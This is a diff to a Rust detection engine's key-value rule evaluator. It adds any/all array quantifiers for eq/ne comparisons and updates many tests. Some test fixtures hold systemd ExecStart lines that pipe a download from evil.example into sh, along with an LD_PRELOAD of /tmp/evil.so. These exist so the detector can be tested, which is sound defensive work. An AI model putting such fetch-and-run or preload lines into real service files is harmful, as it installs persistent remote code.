@@ -27,7 +27,7 @@
 //! ```
 
 use crate::analyzers::utils::{MAX_XML_DEPTH, parse_xml_safe};
-use crate::composite_rules::condition::Condition;
+use crate::composite_rules::condition::{ArrayQuantifier, Condition, KvQuery};
 use crate::composite_rules::context::EvaluationContext;
 use crate::types::Evidence;
 use regex::Regex;
@@ -1531,18 +1531,19 @@ pub(crate) fn parse_structured_content(
 #[must_use]
 pub(crate) fn evaluate_kv(condition: &Condition, ctx: &EvaluationContext<'_>) -> Option<Evidence> {
     let _mp = crate::mem_profile::phase(crate::mem_profile::Phase::EvalKv);
-    let Condition::Kv {
+    let Condition::Kv(KvQuery {
         path,
         exact,
         substr,
         regex: _,
         eq,
         ne,
+        match_mode,
         case_insensitive,
         exists,
         size_min,
         size_max,
-    } = condition
+    }) = condition
     else {
         return None;
     };
@@ -1553,11 +1554,11 @@ pub(crate) fn evaluate_kv(condition: &Condition, ctx: &EvaluationContext<'_>) ->
     // entry. Always case-insensitive + whitespace-trimmed; if you need
     // strict matching, use `exact:` against a literal.
     if eq.is_some() || ne.is_some() {
-        return evaluate_kv_eq_ne(path, eq.as_deref(), ne.as_deref(), ctx);
+        return evaluate_kv_eq_ne(path, eq.as_deref(), ne.as_deref(), *match_mode, ctx);
     }
 
     // Get the string regex pattern for debug
-    let regex_str = if let Condition::Kv { regex, .. } = condition {
+    let regex_str = if let Condition::Kv(KvQuery { regex, .. }) = condition {
         regex.clone()
     } else {
         None
@@ -1786,79 +1787,103 @@ fn evaluate_kv_eq_ne(
     left_path: &str,
     eq: Option<&str>,
     ne: Option<&str>,
+    quant: ArrayQuantifier,
     ctx: &EvaluationContext<'_>,
 ) -> Option<Evidence> {
     let right_path = eq.or(ne)?;
     let want_equal = eq.is_some();
 
-    let left = resolve_first_value(left_path, ctx);
-    let right = resolve_first_value(right_path, ctx);
+    // Either side may resolve to multiple values — a bare array (`pkg.foo`) or
+    // a wildcard path (`pkg.foo[*]`). For each right value we ask whether SOME
+    // left value satisfies the relation (`==` for eq, `!=` for ne); the
+    // quantifier then decides whether that must hold for `any` right value
+    // (default) or for `all` of them. The common scalar-vs-scalar case has one
+    // value per side, so both quantifiers reduce to a plain compare and existing
+    // rules are unaffected. The array case is the new capability — e.g. a
+    // package's declared owner `ne` its source-repo owners with `match: any`
+    // fires when ANY source owner differs (fork impersonation), while `match:
+    // all` would require every source to differ.
+    let left: Vec<String> = resolve_all_values(left_path, ctx)
+        .into_iter()
+        .filter_map(value_as_normalized_string)
+        .collect();
+    let right: Vec<String> = resolve_all_values(right_path, ctx)
+        .into_iter()
+        .filter_map(value_as_normalized_string)
+        .collect();
 
-    // Both sides must resolve to a concrete (scalar-printable) value.
-    // If either is missing, the comparison is undefined — return no
-    // match. Trait authors who want "fire when X is present and Y is
-    // absent" can combine with `exists:` in a separate condition.
-    let left_str = left.and_then(value_as_normalized_string)?;
-    let right_str = right.and_then(value_as_normalized_string)?;
+    // A missing/empty side leaves the comparison undefined — no match. (Combine
+    // with `exists:` in a separate condition for "present here, absent there".)
+    if left.is_empty() || right.is_empty() {
+        return None;
+    }
 
-    let equal = left_str == right_str;
-    if equal != want_equal {
+    let satisfied = |r: &String| {
+        left.iter()
+            .any(|l| if want_equal { l == r } else { l != r })
+    };
+    let fired = match quant {
+        ArrayQuantifier::Any => right.iter().any(satisfied),
+        ArrayQuantifier::All => right.iter().all(satisfied),
+    };
+    if !fired {
         return None;
     }
 
     let op = if want_equal { "==" } else { "!=" };
-    let value = format!(
-        "{} {} {} ({:?} {} {:?})",
-        left_path, op, right_path, left_str, op, right_str
-    );
     Some(Evidence {
         method: "value".to_string(),
         source: ctx.report.target.path.clone(),
-        value,
-        location: Some(format!("value:{}", left_path)),
+        value: format!("{left_path} {op} {right_path}"),
+        location: Some(format!("value:{left_path}")),
         ..Default::default()
     })
 }
 
-/// Look up the first value at `qualified_path`, optionally crossing
-/// into a sibling archive entry's value tree via the `<filename>::`
-/// prefix. Returns the first navigation hit (multi-hit paths like
-/// `arr[*].x` are not meaningful for path-vs-path comparison and the
-/// first element is taken).
-fn resolve_first_value(qualified_path: &str, ctx: &EvaluationContext<'_>) -> Option<Value> {
+/// Append a value to `out`, flattening one array level so a bare array path
+/// and a `[*]` wildcard path both contribute their scalar elements.
+fn push_flat(out: &mut Vec<Value>, v: &Value) {
+    match v {
+        Value::Array(arr) => out.extend(arr.iter().cloned()),
+        other => out.push(other.clone()),
+    }
+}
+
+/// Resolve every value at `qualified_path`, optionally crossing into a sibling
+/// archive entry's value tree via the `<filename>::` prefix. Arrays are
+/// flattened one level (see [`push_flat`]) so eq/ne can quantify over their
+/// elements.
+fn resolve_all_values(qualified_path: &str, ctx: &EvaluationContext<'_>) -> Vec<Value> {
     let (sibling, path) = split_qualified_path(qualified_path);
-    let segments = parse_path(path).ok()?;
+    let Ok(segments) = parse_path(path) else {
+        return Vec::new();
+    };
+    let mut out = Vec::new();
     match sibling {
         None => {
-            // Current file: try the synthetic values_tree the analyzer
-            // attached to the report (covers filefacts-emitted values
-            // for binaries and structured manifests alike).
+            // Current file: the synthetic values_tree the analyzer attached to
+            // the report (filefacts-emitted values for binaries and manifests).
             if let Some(tree) = ctx.report.values_tree.as_ref() {
-                let hits = navigate(tree.as_ref(), &segments);
-                if let Some(first) = hits.first() {
-                    return Some((*first).clone());
+                for v in navigate(tree.as_ref(), &segments) {
+                    push_flat(&mut out, v);
                 }
             }
-            None
         }
         Some(name) => {
-            // Sibling archive entry: walk `report.files[]` for a matching
-            // basename. Case-insensitive match mirrors the eq/ne default —
-            // `package.json::name` matches a file whose path tail is exactly
-            // `package.json` regardless of surrounding directory. We read the
-            // already-flattened `file.kv` (the dotted key is the path) rather
-            // than a per-file values tree: `kv` is always present and, unlike
-            // the tree, isn't dropped when members fold into the container.
+            // Sibling archive entry: first `report.files[]` whose basename
+            // matches (case-insensitive). Reads the already-flattened `file.kv`,
+            // which is always present even when members fold into the container.
             for file in &ctx.report.files {
                 if sibling_path_matches(&file.path, name)
                     && let Some(v) = file.kv.get(path)
                 {
-                    return Some(v.clone());
+                    push_flat(&mut out, v);
+                    break;
                 }
             }
-            None
         }
     }
+    out
 }
 
 /// True when `entry_path` (an archive-internal path like
@@ -2001,7 +2026,8 @@ mod tests {
         let ctx = create_test_ctx_with_values_tree(&[], path, FileType::All, kv);
 
         // Cyrillic-author regex fires.
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "summary.author".to_string(),
             exact: None,
             substr: None,
@@ -2012,11 +2038,12 @@ mod tests {
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv(&cond, &ctx).is_some());
 
         // Excel.Sheet.8 in compobj fires.
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "ole.compobj.app_version".to_string(),
             exact: None,
             substr: Some("Excel.".to_string()),
@@ -2027,11 +2054,12 @@ mod tests {
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv(&cond, &ctx).is_some());
 
         // Path that doesn't exist returns None.
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "summary.title".to_string(),
             exact: Some("anything".to_string()),
             substr: None,
@@ -2042,7 +2070,7 @@ mod tests {
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv(&cond, &ctx).is_none());
     }
 
@@ -2060,7 +2088,8 @@ Author-email: security-research@example.com
         let path = std::path::Path::new("METADATA");
         let ctx = create_test_ctx_with_values_tree(pkginfo, path, FileType::PkgInfo, kv);
 
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "summary".to_string(),
             exact: None,
             substr: None,
@@ -2071,7 +2100,7 @@ Author-email: security-research@example.com
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv(&cond, &ctx).is_some());
     }
 
@@ -2622,7 +2651,8 @@ Author-email: security-research@example.com
         let package_json = br#"{"name": "test", "version": "1.0.0"}"#;
         let path = Path::new("package.json");
 
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "description".to_string(),
             exact: None,
             substr: None,
@@ -2633,7 +2663,7 @@ Author-email: security-research@example.com
             exists: Some(false),
             size_min: None,
             size_max: None,
-        };
+        });
 
         // "description" doesn't exist, so exists: false should match
         assert!(evaluate_kv_test(&cond, package_json, path).is_some());
@@ -2645,7 +2675,8 @@ Author-email: security-research@example.com
         let package_json = br#"{"name": "test", "description": "A test"}"#;
         let path = Path::new("package.json");
 
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "description".to_string(),
             exact: None,
             substr: None,
@@ -2656,7 +2687,7 @@ Author-email: security-research@example.com
             exists: Some(false),
             size_min: None,
             size_max: None,
-        };
+        });
 
         // "description" exists, so exists: false should NOT match
         assert!(evaluate_kv_test(&cond, package_json, path).is_none());
@@ -2668,7 +2699,8 @@ Author-email: security-research@example.com
         let package_json = br#"{"name": "test", "description": "A test"}"#;
         let path = Path::new("package.json");
 
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "description".to_string(),
             exact: None,
             substr: None,
@@ -2679,7 +2711,7 @@ Author-email: security-research@example.com
             exists: Some(true),
             size_min: None,
             size_max: None,
-        };
+        });
 
         // "description" exists, so exists: true should match
         assert!(evaluate_kv_test(&cond, package_json, path).is_some());
@@ -2691,7 +2723,8 @@ Author-email: security-research@example.com
         let package_json = br#"{"name": "test", "version": "1.0.0"}"#;
         let path = Path::new("package.json");
 
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "description".to_string(),
             exact: None,
             substr: None,
@@ -2702,7 +2735,7 @@ Author-email: security-research@example.com
             exists: Some(true),
             size_min: None,
             size_max: None,
-        };
+        });
 
         // "description" doesn't exist, so exists: true should NOT match
         assert!(evaluate_kv_test(&cond, package_json, path).is_none());
@@ -2721,7 +2754,8 @@ Author-email: security-research@example.com
         let path = Path::new("package.json");
 
         // Exactly 1 maintainer
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "maintainers".to_string(),
             exact: None,
             substr: None,
@@ -2732,7 +2766,7 @@ Author-email: security-research@example.com
             exists: None,
             size_min: Some(1),
             size_max: Some(1),
-        };
+        });
 
         assert!(evaluate_kv_test(&cond, package_json, path).is_some());
     }
@@ -2746,7 +2780,8 @@ Author-email: security-research@example.com
         let path = Path::new("package.json");
 
         // Empty dependencies object
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "dependencies".to_string(),
             exact: None,
             substr: None,
@@ -2757,7 +2792,7 @@ Author-email: security-research@example.com
             exists: None,
             size_min: None,
             size_max: Some(0),
-        };
+        });
 
         assert!(evaluate_kv_test(&cond, package_json, path).is_some());
     }
@@ -2775,7 +2810,8 @@ Author-email: security-research@example.com
         let path = Path::new("package.json");
 
         // 30+ keywords (SEO spam)
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "keywords".to_string(),
             exact: None,
             substr: None,
@@ -2786,7 +2822,7 @@ Author-email: security-research@example.com
             exists: None,
             size_min: Some(30),
             size_max: None,
-        };
+        });
 
         assert!(evaluate_kv_test(&cond, package_json.as_bytes(), path).is_some());
     }
@@ -2923,7 +2959,8 @@ Author-email: security-research@example.com
         );
 
         // Verify kv evaluation also returns None
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "api_key".to_string(),
             exact: Some("secret123".to_string()),
             substr: None,
@@ -2934,7 +2971,7 @@ Author-email: security-research@example.com
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
 
         assert!(evaluate_kv_test(&cond, json_content, Path::new("random.json")).is_none());
         assert!(evaluate_kv_test(&cond, json_content, Path::new("config.json")).is_none());
@@ -2960,7 +2997,8 @@ Author-email: security-research@example.com
         );
 
         // Verify kv evaluation returns None
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "database.password".to_string(),
             exact: Some("secret".to_string()),
             substr: None,
@@ -2971,7 +3009,7 @@ Author-email: security-research@example.com
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
 
         assert!(evaluate_kv_test(&cond, yaml_content, Path::new("config.yaml")).is_none());
     }
@@ -2996,7 +3034,8 @@ Author-email: security-research@example.com
         );
 
         // Verify kv evaluation returns None
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "database.password".to_string(),
             exact: Some("secret".to_string()),
             substr: None,
@@ -3007,7 +3046,7 @@ Author-email: security-research@example.com
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
 
         assert!(evaluate_kv_test(&cond, toml_content, Path::new("config.toml")).is_none());
     }
@@ -3034,7 +3073,8 @@ Author-email: security-research@example.com
         );
 
         // Verify kv evaluation works
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "name".to_string(),
             exact: Some("malicious-package".to_string()),
             substr: None,
@@ -3045,7 +3085,7 @@ Author-email: security-research@example.com
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
 
         assert!(evaluate_kv_test(&cond, package_json, Path::new("package.json")).is_some());
     }
@@ -3067,7 +3107,8 @@ Author-email: security-research@example.com
         );
 
         // Verify kv evaluation works
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "package.name".to_string(),
             exact: Some("malicious-crate".to_string()),
             substr: None,
@@ -3078,7 +3119,7 @@ Author-email: security-research@example.com
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
 
         assert!(evaluate_kv_test(&cond, cargo_toml, Path::new("Cargo.toml")).is_some());
     }
@@ -3109,7 +3150,8 @@ Author-email: security-research@example.com
         );
 
         // Verify kv evaluation works for workflows
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "name".to_string(),
             exact: Some("CI".to_string()),
             substr: None,
@@ -3120,7 +3162,7 @@ Author-email: security-research@example.com
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
 
         assert!(evaluate_kv_test(&cond, workflow, Path::new(".github/workflows/ci.yml")).is_some());
         assert!(evaluate_kv_test(&cond, workflow, Path::new("ci.yml")).is_some());
@@ -3141,7 +3183,8 @@ Author-email: security-research@example.com
         );
 
         // Verify kv evaluation doesn't work
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "perfectly".to_string(),
             exact: Some("valid".to_string()),
             substr: None,
@@ -3152,7 +3195,7 @@ Author-email: security-research@example.com
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
 
         assert!(evaluate_kv_test(&cond, valid_json, Path::new("database.json")).is_none());
     }
@@ -3407,7 +3450,8 @@ WantedBy=multi-user.target graphical.target
 "#;
         let path = Path::new("evil.service");
 
-        let exec_start = Condition::Kv {
+        let exec_start = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "service.exec_start".to_string(),
             exact: None,
             substr: Some("evil.example/payload.sh".to_string()),
@@ -3418,10 +3462,11 @@ WantedBy=multi-user.target graphical.target
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&exec_start, service, path).is_some());
 
-        let ld_preload = Condition::Kv {
+        let ld_preload = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "service.environment.LD_PRELOAD".to_string(),
             exact: Some("/tmp/evil.so".to_string()),
             substr: None,
@@ -3432,10 +3477,11 @@ WantedBy=multi-user.target graphical.target
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&ld_preload, service, path).is_some());
 
-        let wanted_by_member = Condition::Kv {
+        let wanted_by_member = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "install.wanted_by".to_string(),
             exact: Some("multi-user.target".to_string()),
             substr: None,
@@ -3446,10 +3492,11 @@ WantedBy=multi-user.target graphical.target
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&wanted_by_member, service, path).is_some());
 
-        let wanted_by_size = Condition::Kv {
+        let wanted_by_size = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "install.wanted_by".to_string(),
             exact: None,
             substr: None,
@@ -3460,10 +3507,11 @@ WantedBy=multi-user.target graphical.target
             exists: Some(true),
             size_min: Some(2),
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&wanted_by_size, service, path).is_some());
 
-        let old_exec_start = Condition::Kv {
+        let old_exec_start = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "service.exec_start".to_string(),
             exact: Some("/bin/old".to_string()),
             substr: None,
@@ -3474,7 +3522,7 @@ WantedBy=multi-user.target graphical.target
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&old_exec_start, service, path).is_none());
     }
 
@@ -3482,7 +3530,8 @@ WantedBy=multi-user.target graphical.target
     fn test_evaluate_kv_systemd_service_drop_in() {
         let service = b"[Service]\nExecStart=/usr/bin/curl https://evil.example/dropin.sh | sh\n";
         let path = Path::new("/etc/systemd/system/ssh.service.d/override.conf");
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "service.exec_start".to_string(),
             exact: None,
             substr: Some("evil.example/dropin.sh".to_string()),
@@ -3493,7 +3542,7 @@ WantedBy=multi-user.target graphical.target
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, service, path).is_some());
     }
 
@@ -3501,7 +3550,8 @@ WantedBy=multi-user.target graphical.target
     fn test_evaluate_kv_systemd_service_file_type_override() {
         let service = b"[Service]\nExecStart=/bin/bash -c curl https://evil.example | sh\n";
         let path = Path::new("suspicious.txt");
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "service.exec_start".to_string(),
             exact: None,
             substr: Some("evil.example".to_string()),
@@ -3512,7 +3562,7 @@ WantedBy=multi-user.target graphical.target
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(
             evaluate_kv_test_with_file_type(&cond, service, path, FileType::SystemdService)
                 .is_some()
@@ -3611,7 +3661,8 @@ Environment="LD_PRELOAD=/tmp/evil.so" "URL=https://evil.example/payload.sh"
 "#;
         let path = Path::new("evil.service");
 
-        let env_list_item = Condition::Kv {
+        let env_list_item = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "service.environment_list[*]".to_string(),
             exact: Some("LD_PRELOAD=/tmp/evil.so".to_string()),
             substr: None,
@@ -3622,10 +3673,11 @@ Environment="LD_PRELOAD=/tmp/evil.so" "URL=https://evil.example/payload.sh"
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&env_list_item, service, path).is_some());
 
-        let env_var = Condition::Kv {
+        let env_var = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "service.environment.URL".to_string(),
             exact: Some("https://evil.example/payload.sh".to_string()),
             substr: None,
@@ -3636,10 +3688,11 @@ Environment="LD_PRELOAD=/tmp/evil.so" "URL=https://evil.example/payload.sh"
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&env_var, service, path).is_some());
 
-        let raw_env = Condition::Kv {
+        let raw_env = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "service._raw.environment".to_string(),
             exact: None,
             substr: Some("URL=https://evil.example/payload.sh".to_string()),
@@ -3650,7 +3703,7 @@ Environment="LD_PRELOAD=/tmp/evil.so" "URL=https://evil.example/payload.sh"
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&raw_env, service, path).is_some());
     }
 
@@ -3670,7 +3723,8 @@ Environment="LD_PRELOAD=/tmp/evil.so" "URL=https://evil.example/payload.sh"
         let path = Path::new("manifest.json");
 
         // Test exact match in array
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "permissions".to_string(),
             exact: Some("debugger".to_string()),
             substr: None,
@@ -3681,11 +3735,12 @@ Environment="LD_PRELOAD=/tmp/evil.so" "URL=https://evil.example/payload.sh"
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, manifest, path).is_some());
 
         // Test non-matching exact
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "permissions".to_string(),
             exact: Some("cookies".to_string()),
             substr: None,
@@ -3696,11 +3751,12 @@ Environment="LD_PRELOAD=/tmp/evil.so" "URL=https://evil.example/payload.sh"
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, manifest, path).is_none());
 
         // Test manifest_version
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "manifest_version".to_string(),
             exact: Some("3".to_string()),
             substr: None,
@@ -3711,7 +3767,7 @@ Environment="LD_PRELOAD=/tmp/evil.so" "URL=https://evil.example/payload.sh"
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, manifest, path).is_some());
     }
 
@@ -3734,7 +3790,8 @@ Environment="LD_PRELOAD=/tmp/evil.so" "URL=https://evil.example/payload.sh"
         let path = Path::new("manifest.json");
 
         // Test wildcard path with exact match
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "content_scripts[*].matches".to_string(),
             exact: Some("<all_urls>".to_string()),
             substr: None,
@@ -3745,11 +3802,12 @@ Environment="LD_PRELOAD=/tmp/evil.so" "URL=https://evil.example/payload.sh"
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, manifest, path).is_some());
 
         // Test wildcard path with substr
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "content_scripts[*].matches".to_string(),
             exact: None,
             substr: Some("amazon".to_string()),
@@ -3760,11 +3818,12 @@ Environment="LD_PRELOAD=/tmp/evil.so" "URL=https://evil.example/payload.sh"
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, manifest, path).is_some());
 
         // Test run_at
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "content_scripts[*].run_at".to_string(),
             exact: Some("document_start".to_string()),
             substr: None,
@@ -3775,7 +3834,7 @@ Environment="LD_PRELOAD=/tmp/evil.so" "URL=https://evil.example/payload.sh"
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, manifest, path).is_some());
     }
 
@@ -3796,7 +3855,8 @@ Environment="LD_PRELOAD=/tmp/evil.so" "URL=https://evil.example/payload.sh"
         let path = Path::new("package.json");
 
         // Test existence check
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "scripts.postinstall".to_string(),
             exact: None,
             substr: None,
@@ -3807,11 +3867,12 @@ Environment="LD_PRELOAD=/tmp/evil.so" "URL=https://evil.example/payload.sh"
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, package, path).is_some());
 
         // Test substr
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "scripts.postinstall".to_string(),
             exact: None,
             substr: Some("curl".to_string()),
@@ -3822,11 +3883,12 @@ Environment="LD_PRELOAD=/tmp/evil.so" "URL=https://evil.example/payload.sh"
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, package, path).is_some());
 
         // Test regex
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "scripts.postinstall".to_string(),
             exact: None,
             substr: None,
@@ -3837,11 +3899,12 @@ Environment="LD_PRELOAD=/tmp/evil.so" "URL=https://evil.example/payload.sh"
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, package, path).is_some());
 
         // Test non-existent key
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "scripts.preinstall".to_string(),
             exact: None,
             substr: None,
@@ -3852,7 +3915,7 @@ Environment="LD_PRELOAD=/tmp/evil.so" "URL=https://evil.example/payload.sh"
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, package, path).is_none());
     }
 
@@ -3867,7 +3930,8 @@ name: test
 
         let path = Path::new(".github/workflows/ci.yml");
 
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "permissions".to_string(),
             exact: Some("debugger".to_string()),
             substr: None,
@@ -3878,7 +3942,7 @@ name: test
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, yaml, path).is_some());
     }
 
@@ -3897,7 +3961,8 @@ openssl = "0.10"
         let path = Path::new("Cargo.toml");
 
         // Test existence
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "dependencies.openssl".to_string(),
             exact: None,
             substr: None,
@@ -3908,11 +3973,12 @@ openssl = "0.10"
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, toml, path).is_some());
 
         // Test non-existent
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "dependencies.tokio".to_string(),
             exact: None,
             substr: None,
@@ -3923,11 +3989,12 @@ openssl = "0.10"
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, toml, path).is_none());
 
         // Test exact value
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "package.name".to_string(),
             exact: Some("my-crate".to_string()),
             substr: None,
@@ -3938,7 +4005,7 @@ openssl = "0.10"
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, toml, path).is_some());
     }
 
@@ -3952,7 +4019,8 @@ openssl = "0.10"
         let path = Path::new("package.json");
 
         // Empty array exists
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "permissions".to_string(),
             exact: None,
             substr: None,
@@ -3963,11 +4031,12 @@ openssl = "0.10"
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, json, path).is_some());
 
         // But contains nothing
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "permissions".to_string(),
             exact: Some("anything".to_string()),
             substr: None,
@@ -3978,7 +4047,7 @@ openssl = "0.10"
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, json, path).is_none());
     }
 
@@ -3988,7 +4057,8 @@ openssl = "0.10"
         let path = Path::new("package.json");
 
         // Path exists
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "value".to_string(),
             exact: None,
             substr: None,
@@ -3999,11 +4069,12 @@ openssl = "0.10"
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, json, path).is_some());
 
         // exact: "null" matches
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "value".to_string(),
             exact: Some("null".to_string()),
             substr: None,
@@ -4014,7 +4085,7 @@ openssl = "0.10"
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, json, path).is_some());
     }
 
@@ -4023,7 +4094,8 @@ openssl = "0.10"
         let json = br#"{"a": {"b": {"c": {"d": {"e": "found"}}}}}"#;
         let path = Path::new("package.json");
 
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "a.b.c.d.e".to_string(),
             exact: Some("found".to_string()),
             substr: None,
@@ -4034,7 +4106,7 @@ openssl = "0.10"
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, json, path).is_some());
     }
 
@@ -4043,7 +4115,8 @@ openssl = "0.10"
         let json = r#"{"name": "日本語パッケージ"}"#.as_bytes();
         let path = Path::new("package.json");
 
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "name".to_string(),
             exact: None,
             substr: Some("日本語".to_string()),
@@ -4054,7 +4127,7 @@ openssl = "0.10"
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, json, path).is_some());
     }
 
@@ -4063,7 +4136,8 @@ openssl = "0.10"
         let bad = br#"{"broken": }"#;
         let path = Path::new("package.json");
 
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "broken".to_string(),
             exact: None,
             substr: None,
@@ -4074,7 +4148,7 @@ openssl = "0.10"
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
